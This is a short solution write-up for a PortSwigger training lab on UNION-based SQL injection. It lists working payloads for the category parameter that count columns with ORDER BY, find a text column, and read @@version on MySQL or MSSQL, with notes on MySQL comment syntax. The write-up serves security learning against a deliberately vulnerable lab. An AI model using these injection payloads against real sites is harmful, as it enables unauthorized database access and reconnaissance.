# Lab 08 — SQL injection attack, querying the database type and version on MySQL and Microsoft

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

**Entry point:** `GET /filter?category=`

## Goal

Display the database version string via UNION on a MySQL or Microsoft
SQL Server database.

## Solution

1. Column count — same methodology:

```
'+ORDER+BY+1--
'+ORDER+BY+2--    ← OK → 2 columns
```

2. Text column:

```
'+UNION+SELECT+'a','a'--
```

3. Both MySQL and MSSQL expose the version in `@@version`:

```
'+UNION+SELECT+@@version,NULL--
```

4. The page shows e.g. `8.0.34 (MySQL)` or
   `Microsoft SQL Server 2019 ...` — lab solved.

## Notes — MySQL-specific gotchas

- MySQL requires a **space (or comment) after `--`**: use `-- -` or `--+`.
- On MySQL you can also comment out the rest of the query with `#`.
